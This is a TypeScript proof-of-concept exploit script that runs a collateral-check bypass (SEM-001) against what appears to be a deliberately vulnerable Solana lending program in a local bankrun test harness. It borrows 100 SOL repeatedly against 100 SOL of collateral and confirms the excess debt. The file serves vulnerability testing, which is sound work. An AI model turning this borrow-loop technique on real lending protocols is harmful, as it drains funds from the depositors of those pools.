/**
 * BANKRUN EXPLOIT: Collateral Check Bypass (SEM-001)
 *
 * Vulnerability: The borrow() function checks `user.deposited >= amount` but
 * ignores existing borrows. A user can deposit 100 SOL and borrow 100 SOL
 * repeatedly because the check never considers cumulative debt.
 *
 * Expected: user.deposited * 75 / 100 >= user.borrowed + amount
 * Actual:   user.deposited >= amount (ignores cumulative debt)
 *
 * This exploit runs against the COMPILED SBF binary via solana-bankrun.
 */

import { start } from "solana-bankrun";
import {
  PublicKey,
  Transaction,
  TransactionInstruction,
  SystemProgram,
  Keypair,
  LAMPORTS_PER_SOL,
} from "@solana/web3.js";
import * as crypto from "crypto";

const PROGRAM_ID = new PublicKey("BJYyF44xEVBfZDQwRdQ2d2ErjWoESsgaXHVcSw7MAv8K");

function ixDisc(name: string): Buffer {
  return Buffer.from(
    crypto.createHash("sha256").update(`global:${name}`).digest()
  ).subarray(0, 8);
}

function accDisc(name: string): Buffer {
  return Buffer.from(
    crypto.createHash("sha256").update(`account:${name}`).digest()
  ).subarray(0, 8);
}

function encodeU64(val: number | bigint): Buffer {
  const buf = Buffer.alloc(8);
  buf.writeBigUInt64LE(BigInt(val));
  return buf;
}

function encodeU16(val: number): Buffer {
  const buf = Buffer.alloc(2);
  buf.writeUInt16LE(val);
  return buf;
}

async function main() {
  console.log("═══════════════════════════════════════════════════════════");
  console.log(" EXPLOIT: Collateral Check Bypass (SEM-001)");
  console.log(" Target: vulnerable_lending::borrow()");
  console.log(" Binary: vuln_lending.so (compiled SBF)");
  console.log("═══════════════════════════════════════════════════════════");
  console.log();

  // Pre-generate keypairs
  const poolKp = Keypair.generate();
  const userAccountKp = Keypair.generate();

  const [vaultPda, vaultBump] = PublicKey.findProgramAddressSync(
    [Buffer.from("vault"), poolKp.publicKey.toBuffer()],
    PROGRAM_ID
  );

  // Account layout constants
  const POOL_SPACE = 8 + 32 + 8 + 8 + 2 + 1; // 59 bytes
  const USER_SPACE = 8 + 32 + 8 + 8; // 56 bytes
  const RENT_POOL = 1113600; // rent-exempt minimum for 59 bytes
  const RENT_USER = 1089600; // rent-exempt minimum for 56 bytes

  // We use a known payer key. The bankrun context generates one automatically,
  // but we need the pubkey for pre-creating accounts. We'll use the context's
  // payer after start and adjust.

  // We can't know the payer pubkey until start(), so we'll use a placeholder
  // for authority and update it after. Actually, we'll use a separate authority.
  const authorityKp = Keypair.generate();

  // Pre-create Pool with 600 SOL deposited
  const poolData = Buffer.concat([
    accDisc("Pool"),
    authorityKp.publicKey.toBuffer(),    // authority (32)
    encodeU64(600 * LAMPORTS_PER_SOL),   // total_deposits (8)
    encodeU64(0),                        // total_borrows (8)
    encodeU16(500),                      // interest_rate (2)
    Buffer.from([vaultBump]),            // bump (1)
  ]);

  // Pre-create UserAccount with 100 SOL deposited, 0 borrowed
  // Owner must match the signer of borrow tx. We'll fix this after start()
  // by using a dummy owner that we'll replace.
  const userDummyOwner = Keypair.generate();
  const userData = Buffer.concat([
    accDisc("UserAccount"),
    userDummyOwner.publicKey.toBuffer(), // owner (32) — will be replaced
    encodeU64(100 * LAMPORTS_PER_SOL),   // deposited (8)
    encodeU64(0),                        // borrowed (8)
  ]);

  // Start bankrun with pre-loaded genesis accounts
  const context = await start(
    [{ name: "vuln_lending", programId: PROGRAM_ID }],
    [
      {
        address: poolKp.publicKey,
        info: { lamports: RENT_POOL, data: poolData, owner: PROGRAM_ID, executable: false },
      },
      {
        address: userAccountKp.publicKey,
        info: { lamports: RENT_USER, data: userData, owner: PROGRAM_ID, executable: false },
      },
      {
        address: vaultPda,
        info: { lamports: 600 * LAMPORTS_PER_SOL, data: Buffer.alloc(0), owner: SystemProgram.programId, executable: false },
      },
    ]
  );

  const client = context.banksClient;
  const payer = context.payer;

  // Fix the UserAccount owner to be the payer (the signer)
  // We need to update the data in-place after start
  // bankrun's setAccount after start can work for the initial slot
  const fixedUserData = Buffer.concat([
    accDisc("UserAccount"),
    payer.publicKey.toBuffer(),          // owner = payer
    encodeU64(100 * LAMPORTS_PER_SOL),   // deposited
    encodeU64(0),                        // borrowed
  ]);
  context.setAccount(userAccountKp.publicKey, {
    lamports: RENT_USER,
    data: fixedUserData,
    owner: PROGRAM_ID,
    executable: false,
  });

  console.log("[1] Genesis accounts loaded:");
  console.log("    Pool: deposited=600 SOL, borrows=0");
  console.log("    User: deposited=100 SOL, borrowed=0");
  console.log("    Vault: 600 SOL");
  console.log();

  // === EXPLOIT: Borrow 100 SOL multiple times ===
  console.log("[2] EXPLOIT: Borrowing 100 SOL repeatedly...");
  console.log("    (check is: deposited >= amount, ignores existing debt)");
  console.log();

  let borrowCount = 0;
  let totalBorrowed = BigInt(0);
  const borrowAmount = 100 * LAMPORTS_PER_SOL;

  for (let i = 0; i < 5; i++) {
    try {
      const borrowIx = new TransactionInstruction({
        programId: PROGRAM_ID,
        keys: [
          { pubkey: poolKp.publicKey, isSigner: false, isWritable: true },
          { pubkey: userAccountKp.publicKey, isSigner: false, isWritable: true },
          { pubkey: payer.publicKey, isSigner: true, isWritable: true },
          { pubkey: vaultPda, isSigner: false, isWritable: true },
          { pubkey: SystemProgram.programId, isSigner: false, isWritable: false },
        ],
        data: Buffer.concat([ixDisc("borrow"), encodeU64(borrowAmount)]),
      });

      context.warpToSlot(BigInt(10 + i * 5));
      const [latestBlockhash] = await client.getLatestBlockhash();
      const borrowTx = new Transaction();
      borrowTx.recentBlockhash = latestBlockhash;
      borrowTx.feePayer = payer.publicKey;
      borrowTx.add(borrowIx);
      borrowTx.sign(payer);
      await client.processTransaction(borrowTx);

      borrowCount++;
      totalBorrowed += BigInt(borrowAmount);
      console.log(`    Borrow #${borrowCount}: 100 SOL (cumulative debt: ${Number(totalBorrowed) / LAMPORTS_PER_SOL} SOL)`);
    } catch (e: any) {
      const msg = e.message || String(e);
      console.log(`    Borrow #${i + 1}: FAILED — ${msg.substring(0, 100)}`);
      break;
    }
  }

  // === Read final state ===
  console.log();
  console.log("[3] Reading final account state...");

  const finalUser = await client.getAccount(userAccountKp.publicKey);
  const finalUserData = Buffer.from(finalUser!.data);
  const finalDeposited = Number(finalUserData.readBigUInt64LE(40)) / LAMPORTS_PER_SOL;
  const finalBorrowed = Number(finalUserData.readBigUInt64LE(48)) / LAMPORTS_PER_SOL;
  const debtRatio = finalDeposited > 0 ? (finalBorrowed / finalDeposited * 100).toFixed(0) : "Infinity";

  console.log(`    Deposited: ${finalDeposited} SOL`);
  console.log(`    Borrowed:  ${finalBorrowed} SOL`);
  console.log(`    Debt ratio: ${debtRatio}%`);

  // === Verdict ===
  console.log();
  if (borrowCount > 1) {
    console.log("═══════════════════════════════════════════════════════════");
    console.log(` >>> EXPLOIT CONFIRMED on compiled SBF binary <<<`);
    console.log(` Borrowed ${Number(totalBorrowed) / LAMPORTS_PER_SOL} SOL with only 100 SOL collateral`);
    console.log(` ${debtRatio}% debt ratio — should be capped at 75%`);
    console.log(` Borrows executed: ${borrowCount} (should be max 1 at 75% LTV)`);
    console.log("═══════════════════════════════════════════════════════════");
  } else {
    console.log("  Exploit did NOT confirm — borrow was properly limited.");
  }
}

main().catch((e) => {
  console.error("Exploit execution error:", e);
  process.exit(1);
});
